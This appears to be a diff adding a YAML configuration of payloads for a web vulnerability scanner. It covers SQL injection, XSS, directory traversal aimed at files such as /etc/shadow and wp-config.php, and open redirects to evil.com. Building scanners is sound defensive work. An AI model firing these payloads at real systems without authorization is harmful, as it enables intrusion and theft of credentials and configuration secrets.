@@ -1,0 +1,176 @@
+# Web Vulnerability Scanner Payloads Configuration
+
+# SQL Injection payloads
+sql_injection:
+  # Boolean-based payloads
+  boolean:
+    - "' OR '1'='1"
+    - "' OR '1'='1' --"
+    - "' OR 1=1 --"
+    - "\" OR 1=1 --"
+    - "1' OR '1'='1"
+    - "1\" OR \"1\"=\"1"
+    - "' OR 1=1#"
+    - "' AND 1=1 --"
+    - "' AND 1=2 --"
+    - "admin' --"
+    - "admin'/*"
+    - "') OR ('1'='1"
+  
+  # Error-based payloads
+  error:
+    - "'"
+    - "\""
+    - "`"
+    - "'\""
+    - "')"
+    - "';--"
+    - "\"','\""
+    - "' OR 1=CONVERT(int,@@version)--"
+    - "' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT version()),0x7e))--"
+    - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--"
+  
+  # UNION-based payloads
+  union:
+    - "' UNION SELECT 1--"
+    - "' UNION SELECT 1,2--"
+    - "' UNION SELECT 1,2,3--"
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT NULL,NULL--"
+    - "' UNION SELECT NULL,NULL,NULL--"
+    - "' UNION SELECT user()--"
+    - "' UNION SELECT user(),database()--"
+    - "' UNION SELECT user(),database(),version()--"
+  
+  # Time-based payloads (use carefully)
+  time:
+    - "'; WAITFOR DELAY '0:0:2'--"
+    - "'; SELECT SLEEP(2)--"
+    - "'; pg_sleep(2)--"
+    - "' OR IF(1=1,SLEEP(2),0)--"
+
+# XSS payloads
+xss:
+  # Basic XSS payloads
+  basic:
+    - "<script>alert('XSS')</script>"
+    - "<script>alert(1)</script>"
+    - "<script>alert(document.cookie)</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<img src=x onerror=alert(1)>"
+    - "<img src=x onerror=alert(document.cookie)>"
+  
+  # Attribute-based payloads
+  attribute:
+    - "\" onmouseover=\"alert('XSS')"
+    - "\" onfocus=\"alert(1)\""
+    - "' onmouseover='alert(\"XSS\")'"
+    - "' onfocus='alert(1)'"
+    - "' autofocus onfocus='alert(1)'"
+  
+  # JavaScript event handler payloads
+  event:
+    - "javascript:alert('XSS')"
+    - "javascript:alert(1)"
+    - "javascript:alert(document.cookie)"
+    - "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
+  
+  # Encoding bypass payloads
+  encoded:
+    - "%3Cscript%3Ealert(1)%3C/script%3E"
+    - "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
+    - "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
+    - "<svg onload=alert(1)>"
+  
+  # Filter bypass payloads
+  bypass:
+    - "<scr<script>ipt>alert(1)</script>"
+    - "<script>a\u006Cert(1)</script>"
+    - "<img src=x onerror=eval('\\u0061lert(1)')>"
+    - "<svg/onload=alert(1)>"
+    - "'\"><script>alert(1)</script>"
+    - "\"'><img src=x onerror=alert(1)>"
+
+# Directory traversal payloads
+directory_traversal:
+  # Basic traversal payloads
+  basic:
+    - "../../../etc/passwd"
+    - "../../../../etc/passwd"
+    - "../../../../../etc/passwd"
+    - "../../../../../../etc/passwd"
+    - "../../../windows/win.ini"
+    - "../../../../windows/win.ini"
+    - "../../../../../windows/win.ini"
+  
+  # Encoded traversal payloads
+  encoded:
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    - "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini"
+    - "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+    - "..%2f..%2f..%2fetc%2fpasswd"
+    - "..%5c..%5c..%5cwindows%5cwin.ini"
+  
+  # Nested traversal payloads
+  nested:
+    - ".../.../.../etc/passwd"
+    - "....//....//....//etc/passwd"
+    - "..././..././..././etc/passwd"
+    - "..///..///..///etc/passwd"
+  
+  # Null byte injection payloads
+  null_byte:
+    - "../../../etc/passwd%00.jpg"
+    - "../../../etc/passwd%00.png"
+    - "../../../../windows/win.ini%00.jpg"
+  
+  # Target file payloads
+  targets:
+    - "../../../../etc/shadow"
+    - "../../../../etc/profile"
+    - "../../../../proc/self/environ"
+    - "../../../../var/log/apache2/access.log"
+    - "../../../../usr/local/etc/apache22/httpd.conf"
+    - "../../../../usr/local/apache/conf/httpd.conf"
+    - "../../../../etc/httpd/conf/httpd.conf"
+    - "../../../../opt/lampp/etc/httpd.conf"
+    - "../../../../xampp/apache/conf/httpd.conf"
+    - "../../../../config.php"
+    - "../../../../wp-config.php"
+
+# Open redirect payloads
+open_redirect:
+  # Basic redirect payloads
+  basic:
+    - "https://evil.com"
+    - "//evil.com"
+    - "https://evil-example.com"
+    - "//evil-example.com"
+    - "https://evil.com/path/to/page"
+    - "//evil.com/path/to/page"
+  
+  # Encoded redirect payloads
+  encoded:
+    - "https%3A%2F%2Fevil.com"
+    - "%2F%2Fevil.com"
+    - "https%253A%252F%252Fevil.com"
+    - "%252F%252Fevil.com"
+  
+  # Protocol bypass payloads
+  protocol:
+    - "javascript://evil.com/%0Aalert(1)"
+    - "data://evil.com/,alert(1)"
+    - "javascript:alert(1)"
+    - "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+  
+  # Filter bypass payloads
+  bypass:
+    - "https://target.com@evil.com"
+    - "https://@evil.com"
+    - "https://evil.com?q=https://target.com"
+    - "https://evil.com#https://target.com"
+    - "https://target.com.evil.com"
+    - "https://evil.com/target.com/"
+    - "https://evil.com%00https://target.com"
+    - "https://evil.com?target.com"
+    - "https://evil.com/target.com"
